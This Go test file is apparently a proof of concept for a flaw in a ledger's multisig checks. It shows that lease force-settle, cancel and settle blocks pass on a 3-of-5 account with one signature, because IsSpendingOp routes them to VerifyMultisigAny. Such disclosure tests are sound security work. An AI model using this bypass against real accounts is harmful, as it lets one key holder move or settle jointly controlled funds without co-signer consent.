package core

import (
	"crypto/ed25519"
	"crypto/rand"
	"encoding/hex"
	"testing"
)

// TestForceSettleBypassesThreshold demonstrates that a 3-of-5 multisig
// account's lease_force_settle block passes verification with only 1 signature.
func TestForceSettleBypassesThreshold(t *testing.T) {
	// Generate 5 keypairs for the multisig keyset
	type kp struct {
		pub  ed25519.PublicKey
		priv ed25519.PrivateKey
		hex  string
	}
	keys := make([]kp, 5)
	for i := range keys {
		pub, priv, err := ed25519.GenerateKey(rand.Reader)
		if err != nil {
			t.Fatal(err)
		}
		keys[i] = kp{pub, priv, hex.EncodeToString(pub)}
	}

	ks := &Keyset{
		Keys:      []string{keys[0].hex, keys[1].hex, keys[2].hex, keys[3].hex, keys[4].hex},
		Threshold: 3,
	}

	// Derive the multisig account address
	addr, err := DeriveMultisigAddress(ks)
	if err != nil {
		t.Fatal(err)
	}

	// Simulate a block hash (in real attack this is the force_settle block hash)
	blockHash := make([]byte, 32)
	rand.Read(blockHash)
	hashHex := hex.EncodeToString(blockHash)

	// Sign with ONLY key[4] (Eve — the rogue single key holder)
	sig := ed25519.Sign(keys[4].priv, blockHash)
	sigs := []BlockSignature{
		{PublicKey: keys[4].hex, Sig: hex.EncodeToString(sig)},
	}

	// VerifyMultisig (threshold=3) MUST fail with 1 sig
	err = VerifyMultisig(hashHex, sigs, ks)
	if err == nil {
		t.Fatal("VerifyMultisig should reject 1-of-5 when threshold=3")
	}
	t.Logf("VerifyMultisig correctly rejects: %v", err)

	// VerifyMultisigAny MUST pass with 1 sig — this is the bypass
	err = VerifyMultisigAny(hashHex, sigs, ks)
	if err != nil {
		t.Fatalf("VerifyMultisigAny should accept 1 valid sig: %v", err)
	}
	t.Logf("VerifyMultisigAny accepts single sig — BYPASS CONFIRMED")

	// Confirm IsSpendingOp excludes BlockLeaseForceSettle
	if IsSpendingOp(BlockLeaseForceSettle) {
		t.Fatal("IsSpendingOp(BlockLeaseForceSettle) should be false (the bug)")
	}
	t.Logf("IsSpendingOp(BlockLeaseForceSettle) = false → routes to VerifyMultisigAny")

	// Also confirm BlockLeaseCancel and BlockLeaseSettle are excluded
	if IsSpendingOp(BlockLeaseCancel) {
		t.Error("BlockLeaseCancel should also be excluded (same class of bug)")
	}
	if IsSpendingOp(BlockLeaseSettle) {
		t.Error("BlockLeaseSettle should also be excluded (same class of bug)")
	}

	_ = addr // used in real PoC against testnet
	t.Logf("Multisig account: %s (3-of-5)", addr[:16])
	t.Log("RESULT: Single key holder can force-settle, cancel, or settle leases")
	t.Log("        on a 3-of-5 multisig account without co-signer consent.")
}